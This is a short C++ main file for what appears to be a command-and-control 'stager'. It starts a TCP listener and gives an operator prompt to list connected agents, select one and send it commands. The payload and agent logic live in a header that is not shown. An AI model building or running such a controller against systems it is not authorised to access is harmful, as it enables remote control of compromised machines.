#include "Stager.h"

using namespace MNet;

int main()
{

	if (not WSA::StartUp())
	{
		ExitProcess(EXIT_FAILURE);
	}

	std::string input;
	Stager TCPStager;
	if (TCPStager.Listen("") != M_Success)
	{
		WSA::ShutDown();
		ExitProcess(EXIT_FAILURE);
	}

	// print help when loading the stager for the first time.
	TCPStager.PrintHelp();
	TCPStager.Run();

	while (true)
	{

		input.clear();

		std::cout << ">> ";
		std::getline(std::cin, input);

		if (input == "")
		{
			continue;
		}
			
		else if (input == "--quit")
		{
			break;
		}
	
		else if (input == "--help")
		{
			TCPStager.PrintHelp();
		}
			

		else if (input == "--listagents")
		{
			TCPStager.PrintAgents();
		}
			
		else if (input.starts_with("--setagent"))
		{
			TCPStager.SetCurrentAgent(input);
		}
			
		else
		{
			if (TCPStager.GetCurrentAgent())
			{
				M_Result res = TCPStager.Logic(input);

				if (res == M_GenericError)
					break;
					
			}

			else
			{
				std::cout << ">> [!] No agent is active." << std::endl;
			}		
		}

	}

	TCPStager.ShutDown();
	WSA::ShutDown();

}